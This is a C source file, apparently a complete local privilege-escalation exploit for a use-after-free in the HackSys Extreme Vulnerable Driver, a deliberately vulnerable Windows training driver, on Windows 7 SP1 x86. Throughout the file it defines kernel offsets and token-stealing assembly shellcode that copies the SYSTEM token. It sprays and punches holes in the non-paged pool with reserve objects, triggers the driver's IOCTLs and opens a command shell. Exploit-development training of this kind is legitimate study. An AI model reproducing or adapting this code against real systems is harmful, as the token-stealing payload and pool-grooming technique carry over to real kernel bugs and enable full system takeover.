/* Includes */
#include "stdafx.h"
#include <stdio.h>
#include <Windows.h>
#include <winioctl.h>
#include <TlHelp32.h>
#include <conio.h>


/* Windows 7 SP1 x86 Offsets */
#define KTHREAD_OFFSET    0x124    // nt!_KPCR.PcrbData.CurrentThread
#define EPROCESS_OFFSET   0x050    // nt!_KTHREAD.ApcState.Process
#define PID_OFFSET        0x0B4    // nt!_EPROCESS.UniqueProcessId
#define FLINK_OFFSET      0x0B8    // nt!_EPROCESS.ActiveProcessLinks.Flink
#define TOKEN_OFFSET      0x0F8    // nt!_EPROCESS.Token
#define SYSTEM_PID        0x004    // SYSTEM Process PID
#define IO_COMPLETION_OBJECT 1
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#define STATUS_UNSUCCESSFUL ((NTSTATUS)0xC0000001L)

/*CTL_CODES retrieved from the driver's source code*/
#define HACKSYS_EVD_IOCTL_ALLOCATE_UAF_OBJECT    CTL_CODE(FILE_DEVICE_UNKNOWN, 0x804, METHOD_NEITHER, FILE_ANY_ACCESS)
#define HACKSYS_EVD_IOCTL_FREE_UAF_OBJECT    CTL_CODE(FILE_DEVICE_UNKNOWN, 0x806, METHOD_NEITHER, FILE_ANY_ACCESS)
#define HEVD_IOCTL_ALLOCATE_FAKE_OBJECT_NON_PAGED_POOL     CTL_CODE(FILE_DEVICE_UNKNOWN, 0x807, METHOD_NEITHER, FILE_ANY_ACCESS)
#define HACKSYS_EVD_IOCTL_USE_UAF_OBJECT     CTL_CODE(FILE_DEVICE_UNKNOWN, 0x805, METHOD_NEITHER, FILE_ANY_ACCESS)

/* our FAKE OBJECT struct*/
typedef struct _FAKE_OBJECT {
	CHAR buffer[0x58];
} FAKE_OBJECT, *PFAKE_OBJECT;


/* Necessary by PUNICODE_STRING*/
typedef struct _LSA_UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR  Buffer;

} LSA_UNICODE_STRING, *PLSA_UNICODE_STRING, UNICODE_STRING, *PUNICODE_STRING;

/* Necessary by POBJECT_ATTRIBUTES*/
typedef struct _OBJECT_ATTRIBUTES {
	ULONG           Length;
	HANDLE          RootDirectory;
	PUNICODE_STRING ObjectName;
	ULONG           Attributes;
	PVOID           SecurityDescriptor;
	PVOID           SecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

/* Necessary TypeDef  to use NtAllocateReserveObject for reserve heap memory chunks */
typedef NTSTATUS(WINAPI *NtAllocateReserveObject_t)(OUT PHANDLE           hObject,
	IN POBJECT_ATTRIBUTES ObjectAttributes,
	IN DWORD              ObjectType);

/* Arrays to implement Heap Spray*/
HANDLE    ReserveObjectArrayA[10000];
HANDLE    ReserveObjectArrayB[5000];


/*Token Stealing Shellcode*/
/* Obtain the CurrentThread with [KTHREAD_OFFSET] from fs 
   Obtain the EPROCESS structure and store address to ecx  
   Walk EPROCESS ActiveProcessLink structure searching for EPROCESS with SYSTEM PID and store the TOKEN structure to after
   replace current process's TOKEN to steal privileges*/

__declspec(naked) VOID TokenStealingShellcodeWin7() {
	// Importance of Kernel Recovery
	__asm {
		pushad; Save registers state

		; Start of Token Stealing Stub
		xor eax, eax; Set ZERO
		mov eax, fs:[eax + KTHREAD_OFFSET]; Get nt!_KPCR.PcrbData.CurrentThread
		; _KTHREAD is located at FS : [0x124]

		mov eax, [eax + EPROCESS_OFFSET]; Get nt!_KTHREAD.ApcState.Process

		mov ecx, eax; Copy current process _EPROCESS structure

		mov edx, SYSTEM_PID; WIN 7 SP1 SYSTEM process PID = 0x4

		SearchSystemPID:
		mov eax, [eax + FLINK_OFFSET]; Get nt!_EPROCESS.ActiveProcessLinks.Flink
			sub eax, FLINK_OFFSET
			cmp[eax + PID_OFFSET], edx; Get nt!_EPROCESS.UniqueProcessId
			jne SearchSystemPID

			mov edx, [eax + TOKEN_OFFSET]; Get SYSTEM process nt!_EPROCESS.Token
			mov edi, [ecx + TOKEN_OFFSET]; Get current process token
			and edx, 0xFFFFFFF8; apply the mask on SYSTEM process token, to remove the referece counter
			and edi, 0x7; apply the mask on the current process token to preserve the referece counter
			add edx, edi; merge AccessToken of SYSTEM with ReferenceCounter of current process
			mov[ecx + TOKEN_OFFSET], edx; Replace target process nt!_EPROCESS.Token
			; with SYSTEM process nt!_EPROCESS.Token
			; End of Token Stealing Stub

			popad; Restore registers state

		}
}

VOID SprayNonPagedPoolWithReserveObjects() {
	UINT32 i = 0;
	HMODULE hModule = NULL;
	NTSTATUS NtStatus = STATUS_UNSUCCESSFUL;
	NtAllocateReserveObject_t     NtAllocateReserveObject;
	hModule = LoadLibraryA("ntdll.dll");

	if (!hModule) {
		printf("\t\t[-] Failed To Load NtDll.dll: 0x%X\n", GetLastError());
		exit(EXIT_FAILURE);
	}

	NtAllocateReserveObject = (NtAllocateReserveObject_t)GetProcAddress(hModule, "NtAllocateReserveObject");

	if (!NtAllocateReserveObject) {
		printf("\t\t[-] Failed Resolving NtAllocateReserveObject: 0x%X\n", GetLastError());
		exit(EXIT_FAILURE);
	}

	for (i = 0; i < 10000; i++) {
		NtStatus = NtAllocateReserveObject(&ReserveObjectArrayA[i], 0, IO_COMPLETION_OBJECT);

		if (NtStatus != STATUS_SUCCESS) {
			printf("\t\t[-] Failed To Allocate Reserve Objects: 0x%X\n", GetLastError());
			exit(EXIT_FAILURE);
		}
	}

	for (i = 0; i < 5000; i++) {
		NtStatus = NtAllocateReserveObject(&ReserveObjectArrayB[i], 0, IO_COMPLETION_OBJECT);

		if (NtStatus != STATUS_SUCCESS) {
			printf("\t\t[-] Failed To Allocate Reserve Objects: 0x%X\n", GetLastError());
			exit(EXIT_FAILURE);
		}
	}
}

VOID CreateHolesInNonPagedPoolByClosingReserveObjects() {
	UINT32 i = 0;

	for (i = 0; i < 5000; i += 2) {
		if (!CloseHandle(ReserveObjectArrayB[i])) {
			printf("\t\t[-] Failed To Close Reserve Objects Handle: 0x%X\n", GetLastError());
			exit(EXIT_FAILURE);
		}
	}
}

VOID FreeReserveObjects() {
	UINT32 i = 0;

	for (i = 0; i < 10000; i++) {
		if (!CloseHandle(ReserveObjectArrayA[i])) {
			printf("\t\t[-] Failed To Close Reserve Objects Handle: 0x%X\n", GetLastError());
			exit(EXIT_FAILURE);
		}
	}
}

int main()
{
	DWORD lpBytesReturned;
	PVOID pMemoryAddress = NULL;
	LPCSTR lpDeviceName = (LPCSTR) "\\\\.\\HackSysExtremeVulnerableDriver";
	PVOID MemoryAddress = NULL;
	PVOID EopPayload = &TokenStealingShellcodeWin7;
	SIZE_T nInBufferSize = (512 + 9) * sizeof(ULONG);
	PFAKE_OBJECT FakeObject = NULL;
	ULONG BytesReturned;
	UINT32 i = 0;

	//printf("%zu\r\n",sizeof(ULONG));
	printf("Getting the device handle\r\n");

	//HANDLE WINAPI CreateFile( _In_ lpFileName, _In_ dwDesiredAccess, _In_ dwShareMode, _In_opt_ lpSecurityAttributes,
	//_In_ dwCreationDisposition, _In_ dwFlagsAndAttributes, _In_opt_ hTemplateFile );
	HANDLE hDriver = CreateFile(lpDeviceName,           //File name - in this case our device name
		GENERIC_READ | GENERIC_WRITE,                   //dwDesiredAccess - type of access to the file, can be read, write, both or neither. We want read and write because thats the permission the driver declares we need.
		FILE_SHARE_READ | FILE_SHARE_WRITE,             //dwShareMode - other processes can read and write to the driver while we're using it but not delete it - FILE_SHARE_DELETE would enable this.
		NULL,                                           //lpSecurityAttributes - Optional, security descriptor for the returned handle and declares whether inheriting processes can access it - unneeded for us.
		OPEN_EXISTING,                                  //dwCreationDisposition - what to do if the file/device doesn't exist, in this case only opens it if it already exists, returning an error if it doesn't.
		FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,   //dwFlagsAndAttributes - In this case the FILE_ATTRIBUTE_NORMAL means that the device has no special file attributes and FILE_FLAG_OVERLAPPED means that the device is being opened for async IO.
		NULL);                                          //hTemplateFile - Optional, only used when creating a new file - takes a handle to a template file which defineds various attributes for the file being created.

	if (hDriver == INVALID_HANDLE_VALUE) {
		printf("Failed to get device handle :( 0x%X\r\n", GetLastError());
		return 1;
	}

	printf("Got the device Handle: 0x%X\r\n", hDriver);

	// Allocate the Heap chunk
	printf("\t\t[Allocating memory buffer]\n");
	FakeObject = (PFAKE_OBJECT)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(FAKE_OBJECT));
	if (!FakeObject) {
		printf("\t\t\t[-] Failed To Allocate Memory: 0x%X\n", GetLastError());
	}
	else {
		printf("\t\t\t[+] Memory Allocated: 0x%p\n", FakeObject);
		printf("\t\t\t[+] Allocation Size: 0x%X\n", sizeof(FAKE_OBJECT));
	}

	printf("\t\t\t[+] Peparing FAKE_OBJECT structure\n");
	RtlFillMemory((PVOID)FakeObject, sizeof(FAKE_OBJECT), 0x41);
	FakeObject->buffer[sizeof(FakeObject->buffer) - 1] = '\0';
	*(PULONG)FakeObject = (ULONG)EopPayload;

	printf("\t\t\t[+]FakeObject Value 0x%p\n", *(PULONG)FakeObject);
	printf("\t\t\t[+]FakeObject Address 0x%p\n", FakeObject);
	printf("\t\t\t[+]FakeObject Size 0X%p\n", sizeof(FAKE_OBJECT));

	printf("\t\t\t[+] EoP Payload 0x%p\n", EopPayload);
	printf("\t\t[+] Spraying\n");
	SprayNonPagedPoolWithReserveObjects();

	/*Creating Holes on even index chunks */
	printf("\t\t[+] Creating Holes\n");
	CreateHolesInNonPagedPoolByClosingReserveObjects();
	
	printf("\t\t[+] Allocate UAF Object\n");
	DeviceIoControl(hDriver,
		HACKSYS_EVD_IOCTL_ALLOCATE_UAF_OBJECT,
		NULL,
		0,
		NULL,
		0,
		&BytesReturned,
		NULL);
	
	printf("\t\t[+] Free UAF Object\n");
	DeviceIoControl(hDriver,
		HACKSYS_EVD_IOCTL_FREE_UAF_OBJECT,
		NULL,
		0,
		NULL,
		0,
		&BytesReturned,
		NULL);

	printf("\t\t[+] Preparing FAKE_OBJECT structure\n");

	for (i = 0; i < 0x250; i++) {
		DeviceIoControl(hDriver,
			HEVD_IOCTL_ALLOCATE_FAKE_OBJECT_NON_PAGED_POOL,
			(LPVOID)FakeObject,
			0,
			NULL,
			0,
			&BytesReturned,
			NULL);
	}
	
	DeviceIoControl(hDriver,
		HACKSYS_EVD_IOCTL_USE_UAF_OBJECT,
		NULL,
		0,
		NULL,
		0,
		&BytesReturned,
		NULL);
	
	system("cmd.exe");
	printf("IOCTL request completed, cleaning up da heap.\r\n");
	HeapFree(GetProcessHeap(), 0, (LPVOID)FakeObject);
	CloseHandle(hDriver);
	return 0;

}

